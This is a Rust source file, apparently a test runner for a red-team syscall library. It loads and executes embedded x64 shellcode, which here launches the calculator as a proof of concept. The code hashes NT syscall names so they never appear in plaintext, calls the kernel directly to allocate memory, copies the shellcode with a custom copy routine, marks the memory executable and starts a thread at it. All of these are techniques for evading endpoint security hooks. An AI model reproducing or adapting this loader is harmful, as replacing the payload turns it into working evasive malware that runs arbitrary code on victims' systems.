//! testing/debugging runner binary

use common::hashing::fnv::Fnv;
use common::util::move_memory;
use std::ffi::c_void;
use std::mem::transmute;
use std::ptr::{null, null_mut};
use syscall::hell::{set_syscall, syscall_1, syscall_11, syscall_3, syscall_5, syscall_6};
use syscall::resolver::SyscallMap;
use windows::Win32::Foundation::{GetLastError, FALSE};

const MEM_RESERVE: u32 = 8192;
const MEM_COMMIT: u32 = 4096;
const PAGE_READWRITE: u32 = 0x04;
const PAGE_EXECUTE_READ: u32 = 0x40;
const SHELLCODE: [u8; 272] = [
    0xFC, 0x48, 0x83, 0xE4, 0xF0, 0xE8, 0xC0, 0x00, 0x00, 0x00, 0x41, 0x51, 0x41, 0x50, 0x52, 0x51,
    0x56, 0x48, 0x31, 0xD2, 0x65, 0x48, 0x8B, 0x52, 0x60, 0x48, 0x8B, 0x52, 0x18, 0x48, 0x8B, 0x52,
    0x20, 0x48, 0x8B, 0x72, 0x50, 0x48, 0x0F, 0xB7, 0x4A, 0x4A, 0x4D, 0x31, 0xC9, 0x48, 0x31, 0xC0,
    0xAC, 0x3C, 0x61, 0x7C, 0x02, 0x2C, 0x20, 0x41, 0xC1, 0xC9, 0x0D, 0x41, 0x01, 0xC1, 0xE2, 0xED,
    0x52, 0x41, 0x51, 0x48, 0x8B, 0x52, 0x20, 0x8B, 0x42, 0x3C, 0x48, 0x01, 0xD0, 0x8B, 0x80, 0x88,
    0x00, 0x00, 0x00, 0x48, 0x85, 0xC0, 0x74, 0x67, 0x48, 0x01, 0xD0, 0x50, 0x8B, 0x48, 0x18, 0x44,
    0x8B, 0x40, 0x20, 0x49, 0x01, 0xD0, 0xE3, 0x56, 0x48, 0xFF, 0xC9, 0x41, 0x8B, 0x34, 0x88, 0x48,
    0x01, 0xD6, 0x4D, 0x31, 0xC9, 0x48, 0x31, 0xC0, 0xAC, 0x41, 0xC1, 0xC9, 0x0D, 0x41, 0x01, 0xC1,
    0x38, 0xE0, 0x75, 0xF1, 0x4C, 0x03, 0x4C, 0x24, 0x08, 0x45, 0x39, 0xD1, 0x75, 0xD8, 0x58, 0x44,
    0x8B, 0x40, 0x24, 0x49, 0x01, 0xD0, 0x66, 0x41, 0x8B, 0x0C, 0x48, 0x44, 0x8B, 0x40, 0x1C, 0x49,
    0x01, 0xD0, 0x41, 0x8B, 0x04, 0x88, 0x48, 0x01, 0xD0, 0x41, 0x58, 0x41, 0x58, 0x5E, 0x59, 0x5A,
    0x41, 0x58, 0x41, 0x59, 0x41, 0x5A, 0x48, 0x83, 0xEC, 0x20, 0x41, 0x52, 0xFF, 0xE0, 0x58, 0x41,
    0x59, 0x5A, 0x48, 0x8B, 0x12, 0xE9, 0x57, 0xFF, 0xFF, 0xFF, 0x5D, 0x48, 0xBA, 0x01, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0x8D, 0x8D, 0x01, 0x01, 0x00, 0x00, 0x41, 0xBA, 0x31, 0x8B,
    0x6F, 0x87, 0xFF, 0xD5, 0xBB, 0xE0, 0x1D, 0x2A, 0x0A, 0x41, 0xBA, 0xA6, 0x95, 0xBD, 0x9D, 0xFF,
    0xD5, 0x48, 0x83, 0xC4, 0x28, 0x3C, 0x06, 0x7C, 0x0A, 0x80, 0xFB, 0xE0, 0x75, 0x05, 0xBB, 0x47,
    0x13, 0x72, 0x6F, 0x6A, 0x00, 0x59, 0x41, 0x89, 0xDA, 0xFF, 0xD5, 0x63, 0x61, 0x6C, 0x63, 0x00,
];

fn main() -> anyhow::Result<()> {
    //
    // currently working hash functions: [ Fnv, Djb, Crc32b ]
    // ---------------------------------------------------------------
    // to hash strings, e.g:                                         |
    // ---------------------------------------------------------------
    //
    // use common::hashing::traits::StringHasher;
    //
    // let syscalls_plaintext = vec![
    //     "NtAllocateVirtualMemory",
    //     "NtProtectVirtualMemory",
    //     "NtCreateThreadEx",
    //     "NtWaitForSingleObject",
    //     "NtClose",
    // ];
    //
    // let crc_hasher = StringHasher::new(Fnv);
    // let mut hashed = crc_hasher.hash(syscalls_plaintext.clone());
    //
    // ---------------------------------------------------------------

    let mut hashes: Vec<u32> = vec![
        0x0000002dca3638,
        0x00000009aecd66,
        0x00000059a5081a,
        0x000000d812fb6e,
        0x000000354d9e65,
    ];

    let mut table = SyscallMap::new(&mut hashes, Fnv);
    table.resolve()?;

    // --- NtAllocateVirtualMemory --------------------------------------------------------------

    let mut s = table.syscalls.get(&hashes[0]).unwrap();
    set_syscall(s.ssn, s.random as u64);

    let proc_handle = (!0isize) as *mut c_void;
    let mut initial_protect = PAGE_READWRITE;
    let mut base_addr = null_mut::<c_void>();
    let mut buff_size = SHELLCODE.len();
    let alloc_type = MEM_RESERVE | MEM_COMMIT;

    let nt_allocate_virtual_memory_args: [u64; 6] = unsafe {
        [
            proc_handle as u64,
            transmute(&mut base_addr),
            0x0, // zero bits arg
            transmute(&mut buff_size),
            alloc_type as u64,
            initial_protect as u64,
        ]
    };

    let mut ntstatus = unsafe { syscall_6(nt_allocate_virtual_memory_args.as_ptr()) };

    if ntstatus != 0x0 {
        panic!(
            "[x] failed to allocate memory: NTSTATUS: {:016x?} | last err: {:?}",
            ntstatus,
            unsafe { GetLastError() }
        );
    }

    unsafe {
        // replaces `std::ptr::copy` with a custom copy function
        _ = move_memory(
            base_addr,
            SHELLCODE.as_ptr() as *const c_void,
            SHELLCODE.len(),
        )
    };

    // --- NtProtectVirtualMemory --------------------------------------------------------------

    s = table.syscalls.get(&hashes[1]).unwrap();
    set_syscall(s.ssn, s.random as u64);

    let nt_protect_virtual_memory_args: [u64; 5] = unsafe {
        [
            proc_handle as u64,
            transmute(&mut base_addr),
            transmute(&mut buff_size),
            PAGE_EXECUTE_READ as u64,
            transmute(&mut initial_protect),
        ]
    };

    ntstatus = unsafe { syscall_5(nt_protect_virtual_memory_args.as_ptr()) };
    if ntstatus != 0x0 {
        panic!(
            "[x] failed to alter memory protections: NTSTATUS: {:016x?} | last err: {:?}",
            ntstatus,
            unsafe { GetLastError() }
        );
    }

    // --- NtCreateThread ----------------------------------------------------------------------

    s = table.syscalls.get(&hashes[2]).unwrap();
    set_syscall(s.ssn, s.random as u64);

    let mut thread_handle: *mut c_void = null_mut();
    let thread_entry: unsafe extern "system" fn(*mut c_void) -> u32 =
        unsafe { transmute(base_addr) };

    let nt_create_thread_ex_args: [u64; 11] = unsafe {
        [
            transmute(&mut thread_handle),
            0x1FFFFF,
            null::<c_void>() as u64,
            proc_handle as u64,
            thread_entry as u64,
            null::<c_void>() as u64,
            FALSE.0 as u64,
            null::<c_void>() as u64,
            null::<c_void>() as u64,
            null::<c_void>() as u64,
            null::<c_void>() as u64,
        ]
    };

    ntstatus = unsafe { syscall_11(nt_create_thread_ex_args.as_ptr()) };
    if ntstatus != 0x0 {
        panic!(
            "[x] failed to create new thread: NTSTATUS: {:016x?} | last err: {:?}",
            ntstatus,
            unsafe { GetLastError() }
        )
    }

    // --- NtWaitForSingleObject ---------------------------------------------------------------

    s = table.syscalls.get(&hashes[3]).unwrap();
    set_syscall(s.ssn, s.random as u64);

    let nt_wait_for_single_object_args: [u64; 3] =
        unsafe { [transmute(thread_handle), 0x00, 0x00] };

    ntstatus = unsafe { syscall_3(nt_wait_for_single_object_args.as_ptr()) };
    if ntstatus != 0x0 {
        panic!(
            "[x] failed to call NtWaitForSingleObject syscall correctly: {:016x?} | last err: {:?}",
            ntstatus,
            unsafe { GetLastError() }
        );
    }

    // --- NtClose ------------------------------------------------------------------------------

    if thread_handle != null_mut() {
        s = table.syscalls.get(&hashes[4]).unwrap();
        set_syscall(s.ssn, s.random as u64);

        let ntstatus = unsafe { syscall_1(transmute(thread_handle)) };

        if ntstatus != 0x0 {
            println!(
                "couldn't closed thread handle! (NSTATUS: {:016x?})",
                ntstatus
            );
        }
    }

    // ------------------------------------------------------------------------------------------

    println!("\n[+] \t- resolved and executed syscalls without issue.\n");
    Ok(())
}
